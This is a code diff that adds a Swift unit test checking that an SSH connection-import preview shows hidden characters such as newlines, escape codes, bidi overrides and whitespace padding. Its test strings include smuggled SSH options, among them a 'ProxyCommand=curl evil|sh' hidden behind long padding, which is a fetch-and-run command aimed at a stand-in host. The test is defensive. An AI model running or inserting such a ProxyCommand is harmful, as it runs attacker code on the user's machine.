@@ -94,6 +94,15 @@ struct ConnectionImportTests {
             == ["web", "v6", "gone", "clash"])
     }
 
+    @Test func previewShowsHiddenCharacters() {
+        #expect(ConnectionImport.visible("-o A=1\n-o ProxyCommand=x") == "-o A=1⏎-o ProxyCommand=x")
+        #expect(ConnectionImport.visible("a\tb\u{1B}[2Kc\r\u{7F}") == "a⇥b␛[2Kc␍␡")
+        #expect(ConnectionImport.visible("x\u{202E}y\u{85}") == "x<U+202E>y<U+85>")
+        let long = "-o ServerAliveInterval=30" + String(repeating: " ", count: 300) + "-o ProxyCommand=curl evil|sh"
+        #expect(ConnectionImport.visible(long) == long)
+        #expect(ConnectionImport.visible("prod 🚀 é") == "prod 🚀 é")
+    }
+
     @Test func exportSelectedFoldersRoundTrips() throws {
         let inner = ConnectionFolder(name: "inner", connections: [conn("i", jump: .text("j"))])
         let a = ConnectionFolder(name: "a", activation: ";a", connections: [conn("c")], folders: [inner])
